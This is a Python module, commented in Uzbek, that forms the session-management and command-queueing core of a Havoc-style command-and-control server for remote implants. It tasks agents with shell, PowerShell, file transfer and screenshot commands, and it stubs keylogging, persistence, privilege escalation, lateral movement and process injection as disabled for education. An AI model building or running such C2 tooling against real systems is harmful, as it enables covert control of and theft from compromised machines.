"""
Havoc-Style Session Management System
Agent session metadata va boshqaruv
"""

import json
import time
import uuid
from datetime import datetime, timedelta
from dataclasses import dataclass, asdict
from typing import Dict, List, Optional
import threading
import sys
import os

# Common modullarni import qilish
sys.path.append(os.path.join(os.path.dirname(__file__), '..'))
from common.config import *
from common.utils import *


@dataclass
class SessionInfo:
    """Session ma'lumotlari"""
    session_id: str
    agent_id: str
    hostname: str
    username: str
    domain: str
    process_name: str
    process_id: int
    arch: str
    os_version: str
    ip_internal: str
    ip_external: str
    first_checkin: str
    last_checkin: str
    sleep_time: int
    jitter: int
    listener: str
    status: str  # active, sleeping, dead, lost
    privileges: str  # user, admin, system
    integrity: str  # low, medium, high, system
    session_key: str
    encryption: bool
    tasks_pending: int
    tasks_completed: int
    total_data_sent: int
    total_data_received: int


class SessionManager:
    """Havoc-style session boshqaruv"""
    
    def __init__(self):
        self.sessions: Dict[str, SessionInfo] = {}
        self.session_lock = threading.Lock()
        self.command_queue: Dict[str, List] = {}
        self.command_results: Dict[str, List] = {}
        
        # Session monitoring
        self.monitoring_thread = threading.Thread(target=self._monitor_sessions, daemon=True)
        self.monitoring_thread.start()
    
    def register_session(self, agent_data: dict, listener_name: str = "unknown") -> str:
        """Yangi session ro'yxatdan o'tkazish"""
        try:
            with self.session_lock:
                session_id = self._generate_session_id()
                agent_id = agent_data.get('agent_id', str(uuid.uuid4()))
                
                # Session info yaratish
                session_info = SessionInfo(
                    session_id=session_id,
                    agent_id=agent_id,
                    hostname=agent_data.get('hostname', 'unknown'),
                    username=agent_data.get('username', 'unknown'),
                    domain=agent_data.get('domain', 'unknown'),
                    process_name=agent_data.get('process_name', 'python.exe'),
                    process_id=agent_data.get('process_id', 0),
                    arch=agent_data.get('architecture', 'x64'),
                    os_version=agent_data.get('platform', 'unknown'),
                    ip_internal=agent_data.get('ip_address', '0.0.0.0'),
                    ip_external=agent_data.get('external_ip', '0.0.0.0'),
                    first_checkin=datetime.now().isoformat(),
                    last_checkin=datetime.now().isoformat(),
                    sleep_time=30,
                    jitter=10,
                    listener=listener_name,
                    status='active',
                    privileges=agent_data.get('privileges', 'user'),
                    integrity=agent_data.get('integrity', 'medium'),
                    session_key=self._generate_session_key(),
                    encryption=False,
                    tasks_pending=0,
                    tasks_completed=0,
                    total_data_sent=0,
                    total_data_received=0
                )
                
                self.sessions[session_id] = session_info
                self.command_queue[session_id] = []
                self.command_results[session_id] = []
                
                self.log(f"🎯 Yangi session: {session_id} ({session_info.hostname})")
                return session_id
                
        except Exception as e:
            self.log(f"❌ Session registration xatosi: {e}")
            return ""
    
    def update_session_checkin(self, session_id: str, checkin_data: dict = None) -> bool:
        """Session checkin yangilash"""
        try:
            with self.session_lock:
                if session_id not in self.sessions:
                    return False
                
                session = self.sessions[session_id]
                session.last_checkin = datetime.now().isoformat()
                session.status = 'active'
                
                # Qo'shimcha ma'lumotlar yangilash
                if checkin_data:
                    if 'process_id' in checkin_data:
                        session.process_id = checkin_data['process_id']
                    if 'privileges' in checkin_data:
                        session.privileges = checkin_data['privileges']
                    if 'integrity' in checkin_data:
                        session.integrity = checkin_data['integrity']
                
                return True
                
        except Exception as e:
            self.log(f"❌ Checkin update xatosi: {e}")
            return False
    
    def queue_command(self, session_id: str, command: dict) -> bool:
        """Sessionga komanda qo'shish"""
        try:
            with self.session_lock:
                if session_id not in self.sessions:
                    return False
                
                # Komanda ID qo'shish
                command['id'] = str(uuid.uuid4())
                command['timestamp'] = datetime.now().isoformat()
                command['status'] = 'pending'
                
                self.command_queue[session_id].append(command)
                self.sessions[session_id].tasks_pending += 1
                
                self.log(f"📤 Komanda navbatga qo'shildi: {session_id} - {command.get('type')}")
                return True
                
        except Exception as e:
            self.log(f"❌ Command queue xatosi: {e}")
            return False
    
    def get_pending_commands(self, session_id: str) -> List[dict]:
        """Session uchun kutilayotgan komandalar"""
        try:
            with self.session_lock:
                if session_id not in self.command_queue:
                    return []
                
                commands = self.command_queue[session_id].copy()
                self.command_queue[session_id].clear()
                
                # Statistics update
                if session_id in self.sessions:
                    self.sessions[session_id].tasks_pending = 0
                
                return commands
                
        except Exception as e:
            self.log(f"❌ Get commands xatosi: {e}")
            return []
    
    def submit_command_result(self, session_id: str, command_id: str, result: dict) -> bool:
        """Komanda natijasini saqlash"""
        try:
            with self.session_lock:
                if session_id not in self.command_results:
                    return False
                
                result_data = {
                    'command_id': command_id,
                    'session_id': session_id,
                    'timestamp': datetime.now().isoformat(),
                    'result': result
                }
                
                self.command_results[session_id].append(result_data)
                
                # Statistics update
                if session_id in self.sessions:
                    self.sessions[session_id].tasks_completed += 1
                
                self.log(f"📥 Komanda natijasi: {session_id} - {command_id}")
                return True
                
        except Exception as e:
            self.log(f"❌ Submit result xatosi: {e}")
            return False
    
    def get_session_info(self, session_id: str) -> Optional[SessionInfo]:
        """Session ma'lumotlarini olish"""
        with self.session_lock:
            return self.sessions.get(session_id)
    
    def get_all_sessions(self) -> Dict[str, SessionInfo]:
        """Barcha sessionlar"""
        with self.session_lock:
            return self.sessions.copy()
    
    def get_active_sessions(self) -> Dict[str, SessionInfo]:
        """Faol sessionlar"""
        with self.session_lock:
            return {
                sid: session for sid, session in self.sessions.items()
                if session.status == 'active'
            }
    
    def kill_session(self, session_id: str, reason: str = "Manual kill") -> bool:
        """Session ni o'chirish"""
        try:
            with self.session_lock:
                if session_id in self.sessions:
                    self.sessions[session_id].status = 'dead'
                    
                    # Cleanup
                    if session_id in self.command_queue:
                        del self.command_queue[session_id]
                    
                    self.log(f"💀 Session o'chirildi: {session_id} - {reason}")
                    return True
                
                return False
                
        except Exception as e:
            self.log(f"❌ Kill session xatosi: {e}")
            return False
    
    def set_session_sleep(self, session_id: str, sleep_time: int, jitter: int = 0) -> bool:
        """Session sleep vaqtini o'rnatish"""
        try:
            with self.session_lock:
                if session_id not in self.sessions:
                    return False
                
                session = self.sessions[session_id]
                session.sleep_time = sleep_time
                session.jitter = jitter
                
                # Sleep komandasi yuborish
                sleep_command = {
                    'type': 'sleep',
                    'data': {
                        'sleep_time': sleep_time,
                        'jitter': jitter
                    }
                }
                
                self.queue_command(session_id, sleep_command)
                
                self.log(f"😴 Sleep o'rnatildi: {session_id} - {sleep_time}s")
                return True
                
        except Exception as e:
            self.log(f"❌ Set sleep xatosi: {e}")
            return False
    
    def get_session_statistics(self) -> dict:
        """Session statistikalari"""
        with self.session_lock:
            total = len(self.sessions)
            active = len([s for s in self.sessions.values() if s.status == 'active'])
            sleeping = len([s for s in self.sessions.values() if s.status == 'sleeping'])
            dead = len([s for s in self.sessions.values() if s.status == 'dead'])
            
            return {
                'total_sessions': total,
                'active_sessions': active,
                'sleeping_sessions': sleeping,
                'dead_sessions': dead,
                'total_commands_pending': sum(len(q) for q in self.command_queue.values()),
                'total_commands_completed': sum(s.tasks_completed for s in self.sessions.values())
            }
    
    def export_sessions_json(self, filepath: str = None) -> str:
        """Sessionlarni JSON formatida eksport qilish"""
        try:
            with self.session_lock:
                sessions_data = {
                    sid: asdict(session) for sid, session in self.sessions.items()
                }
                
                export_data = {
                    'export_timestamp': datetime.now().isoformat(),
                    'total_sessions': len(sessions_data),
                    'sessions': sessions_data
                }
                
                json_data = json.dumps(export_data, indent=2, ensure_ascii=False)
                
                if filepath:
                    with open(filepath, 'w', encoding='utf-8') as f:
                        f.write(json_data)
                    self.log(f"📄 Sessions eksport qilindi: {filepath}")
                
                return json_data
                
        except Exception as e:
            self.log(f"❌ Export xatosi: {e}")
            return ""
    
    def _monitor_sessions(self):
        """Session monitoring thread"""
        while True:
            try:
                current_time = datetime.now()
                timeout_threshold = timedelta(minutes=5)  # 5 minutlik timeout
                
                with self.session_lock:
                    for session_id, session in self.sessions.items():
                        if session.status not in ['active', 'sleeping']:
                            continue
                        
                        # Last checkin vaqtini tekshirish
                        try:
                            last_checkin = datetime.fromisoformat(session.last_checkin)
                            if current_time - last_checkin > timeout_threshold:
                                session.status = 'lost'
                                self.log(f"⚠️ Session lost: {session_id} ({session.hostname})")
                        except:
                            pass
                
                time.sleep(60)  # Har minutda tekshirish
                
            except Exception as e:
                self.log(f"❌ Monitor xatosi: {e}")
                time.sleep(60)
    
    def _generate_session_id(self) -> str:
        """Unique session ID yaratish"""
        return f"S{int(time.time())}{uuid.uuid4().hex[:6].upper()}"
    
    def _generate_session_key(self) -> str:
        """Session key yaratish"""
        return uuid.uuid4().hex
    
    def log(self, message: str):
        """Log xabar"""
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        print(f"[{timestamp}] [SESSION-MGR] {message}")


class CommandProcessor:
    """Havoc-style komanda processor"""
    
    def __init__(self, session_manager: SessionManager):
        self.session_manager = session_manager
        self.command_handlers = {
            'shell': self._handle_shell_command,
            'powershell': self._handle_powershell_command,
            'upload': self._handle_upload_command,
            'download': self._handle_download_command,
            'screenshot': self._handle_screenshot_command,
            'keylogger': self._handle_keylogger_command,
            'persist': self._handle_persistence_command,
            'elevate': self._handle_privilege_escalation,
            'lateral': self._handle_lateral_movement,
            'inject': self._handle_process_injection
        }
    
    def execute_command(self, session_id: str, command_type: str, command_data: dict) -> bool:
        """Komandani bajarish"""
        try:
            if command_type in self.command_handlers:
                command = {
                    'type': command_type,
                    'data': command_data,
                    'session_id': session_id
                }
                
                return self.session_manager.queue_command(session_id, command)
            else:
                self.log(f"❌ Noma'lum komanda turi: {command_type}")
                return False
                
        except Exception as e:
            self.log(f"❌ Execute command xatosi: {e}")
            return False
    
    def _handle_shell_command(self, session_id: str, data: dict):
        """Shell komanda"""
        return {'type': 'exec', 'command': data.get('command', '')}
    
    def _handle_powershell_command(self, session_id: str, data: dict):
        """PowerShell komanda"""
        return {'type': 'powershell', 'script': data.get('script', '')}
    
    def _handle_upload_command(self, session_id: str, data: dict):
        """Fayl yuklash"""
        return {
            'type': 'upload',
            'local_path': data.get('local_path'),
            'remote_path': data.get('remote_path'),
            'file_data': data.get('file_data')
        }
    
    def _handle_download_command(self, session_id: str, data: dict):
        """Fayl yuklash"""
        return {
            'type': 'download',
            'remote_path': data.get('remote_path')
        }
    
    def _handle_screenshot_command(self, session_id: str, data: dict):
        """Screenshot olish"""
        return {'type': 'screenshot', 'quality': data.get('quality', 80)}
    
    def _handle_keylogger_command(self, session_id: str, data: dict):
        """Keylogger (ta'lim maqsadida o'chirib qo'yilgan)"""
        return {'type': 'keylogger', 'action': 'disabled_for_education'}
    
    def _handle_persistence_command(self, session_id: str, data: dict):
        """Persistence (ta'lim maqsadida o'chirib qo'yilgan)"""
        return {'type': 'persist', 'method': 'disabled_for_education'}
    
    def _handle_privilege_escalation(self, session_id: str, data: dict):
        """Privilege escalation (ta'lim maqsadida o'chirib qo'yilgan)"""
        return {'type': 'elevate', 'method': 'disabled_for_education'}
    
    def _handle_lateral_movement(self, session_id: str, data: dict):
        """Lateral movement (ta'lim maqsadida o'chirib qo'yilgan)"""
        return {'type': 'lateral', 'target': 'disabled_for_education'}
    
    def _handle_process_injection(self, session_id: str, data: dict):
        """Process injection (ta'lim maqsadida o'chirib qo'yilgan)"""
        return {'type': 'inject', 'target_pid': 'disabled_for_education'}
    
    def log(self, message: str):
        """Log xabar"""
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        print(f"[{timestamp}] [CMD-PROCESSOR] {message}")


def main():
    """Test funksiya"""
    print("🎯 Havoc-Style Session Management Test")
    
    # Session manager yaratish
    session_manager = SessionManager()
    command_processor = CommandProcessor(session_manager)
    
    # Test session yaratish
    test_agent_data = {
        'agent_id': 'test-agent-001',
        'hostname': 'WIN-TEST-PC',
        'username': 'testuser',
        'domain': 'WORKGROUP',
        'process_name': 'notepad.exe',
        'process_id': 1234,
        'architecture': 'x64',
        'platform': 'Windows 10',
        'ip_address': '192.168.1.100',
        'privileges': 'user',
        'integrity': 'medium'
    }
    
    # Session ro'yxatdan o'tkazish
    session_id = session_manager.register_session(test_agent_data, "http-listener")
    print(f"✅ Test session yaratildi: {session_id}")
    
    # Komanda yuborish
    command_processor.execute_command(session_id, 'shell', {'command': 'whoami'})
    command_processor.execute_command(session_id, 'screenshot', {'quality': 90})
    
    # Session ma'lumotlari
    session_info = session_manager.get_session_info(session_id)
    if session_info:
        print(f"📊 Session: {session_info.hostname} ({session_info.username})")
        print(f"   Status: {session_info.status}")
        print(f"   Tasks: {session_info.tasks_pending} pending, {session_info.tasks_completed} completed")
    
    # Statistika
    stats = session_manager.get_session_statistics()
    print(f"\\n📈 Statistics:")
    print(f"   Total sessions: {stats['total_sessions']}")
    print(f"   Active sessions: {stats['active_sessions']}")
    print(f"   Pending commands: {stats['total_commands_pending']}")


if __name__ == "__main__":
    main()